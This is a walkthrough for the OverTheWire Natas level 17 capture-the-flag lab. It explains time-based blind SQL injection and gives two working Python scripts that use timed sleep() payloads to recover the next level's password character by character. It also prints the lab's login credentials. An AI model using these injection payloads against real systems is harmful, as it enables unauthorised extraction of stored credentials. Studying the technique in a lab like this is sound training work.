# Level 17 -> 18  

Blind SQLI  

we use the sleep response of whether the user exists or not to figure out the password for level 18  

use this script to find charset of the password (i.e. set of characters which make up the password)  

```python
import requests
from requests.auth import HTTPBasicAuth

Auth=HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
headers = {'content-type': 'application/x-www-form-urlencoded'}
filteredchars = ''
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'

for char in allchars:
	payload = 'username=natas18%22+and+password+like+binary+%27%25{0}%25%27+and+sleep%285%29+%23'.format(char)
	r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)
	if(r.elapsed.seconds >= 5):
		filteredchars = filteredchars + char
		print(filteredchars.ljust(len(allchars), "*"))
```

this works because of this query  

```
natas18" AND password LIKE BINARY "%char%" and sleep(5) #"
```

Here %c% indicates anything before or after **c**, whether **c** exists in string  
Here **BINARY** ensures case sensitive comparison  
sleep(5), sleeps for 5 seconds which lets us know whether the comparison is true  

Find password using bruteforce of charset characters using the script below  

```python
import requests
from requests.auth import HTTPBasicAuth

Auth=HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
headers = {'content-type': 'application/x-www-form-urlencoded'}
filteredchars = 'bdgjlmpxyBCDGJKLOPRVZ146'
allchars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
password = ''

for i in range(0, 32):
	for char in filteredchars:
		t = password + char
		payload = 'username=natas18%22+and+password+like+binary+%27{0}%25%27+and+sleep%285%29+%23'.format(t)
		r = requests.post('http://natas17.natas.labs.overthewire.org/index.php', auth=Auth, data=payload, headers=headers)
		if(r.elapsed.seconds >= 5):
			password = t
			print(password.ljust(32, "*"))
			break
```

works beacuse of this query  

```
natas18" AND password LIKE BINARY "t%" and sleep(5) #"
```

t% -> starts wth t which is (password + char)  
